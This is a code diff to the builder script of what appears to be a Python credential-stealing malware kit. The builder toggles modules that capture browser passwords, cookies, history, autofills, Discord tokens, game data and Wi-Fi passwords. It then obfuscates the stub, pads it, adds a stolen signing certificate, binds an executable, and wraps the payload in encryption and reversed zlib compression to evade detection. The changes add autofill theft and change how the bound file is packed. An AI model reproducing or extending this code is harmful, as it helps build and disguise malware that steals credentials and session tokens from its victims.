@@ -5,6 +5,7 @@ import subprocess
 import random
 import string
 import py_compile
+import zlib
 import pyaes
 import zipfile
 
@@ -12,7 +13,6 @@ from urllib3 import PoolManager, disable_warnings
 disable_warnings()
 import BlankOBF as obfuscator
 from sigthief import outputCert
-from pyaes import AESModeOfOperationGCM
 
 SettingsFile = "config.json"
 InCodeFile = "stub.py"
@@ -36,6 +36,7 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
     code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
     code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
+    code = code.replace('%captureautofills%', "true" if settings["modules"]["captureAutofills"] else "")
     code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
     code = code.replace('%capturegames%', "true" if settings["modules"]["captureGames"] else "")
     code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
@@ -56,26 +57,26 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     if injection is not None:
         code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
     
+    return code
+
+def PrepareEnvironment(settings: dict) -> None:
     if os.path.isfile("bound.exe"):
         with open("bound.exe", "rb") as file:
             content = file.read()
-    
-        key = os.urandom(32)
-        iv = os.urandom(32)
-        encrypted = AESModeOfOperationGCM(key, iv).encrypt(content) # File structure: [32 bytes key + 32 bytes iv + encrypted content]
-        with open("bound.aes", "wb") as file:
-            file.write(key)
-            file.write(iv)
+        
+        encrypted = zlib.compress(content)[::-1]
+
+        with open("bound.blank", "wb") as file:
             file.write(encrypted)
         
-        del content, encrypted
+    elif os.path.isfile("bound.blank"):
+        os.remove("bound.blank")
 
-    if __name__ == "__main__":
-        if settings["settings"]["consoleMode"] == 0:
-            open("noconsole", "w").close()
-        else:
-            if os.path.isfile("noconsole"):
-                os.remove("noconsole")
+    if settings["settings"]["consoleMode"] == 0:
+        open("noconsole", "w").close()
+    else:
+        if os.path.isfile("noconsole"):
+            os.remove("noconsole")
     
     pumpedStubSize = settings["settings"]["pumpedStubSize"]
     if pumpedStubSize > 0:
@@ -83,8 +84,6 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
             file.write(str(pumpedStubSize))
     elif os.path.isfile("pumpStub"):
         os.remove("pumpStub")
-    
-    return code
 
 def ReadSettings() -> tuple[dict, str]:
 
@@ -171,6 +170,7 @@ def main() -> None:
         code = file.read()
 
     code = WriteSettings(code, *ReadSettings())
+    PrepareEnvironment(ReadSettings()[0])
 
     obfuscator.BlankOBF(code, OutCodeFile)
     junk(OutCodeFile)
@@ -187,6 +187,7 @@ def main() -> None:
     iv = os.urandom(12)
 
     encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
+    encrypted = zlib.compress(encrypted)[::-1]
     open(zipFile, "wb").write(encrypted)
     
     with open("loader.py", "r") as file:
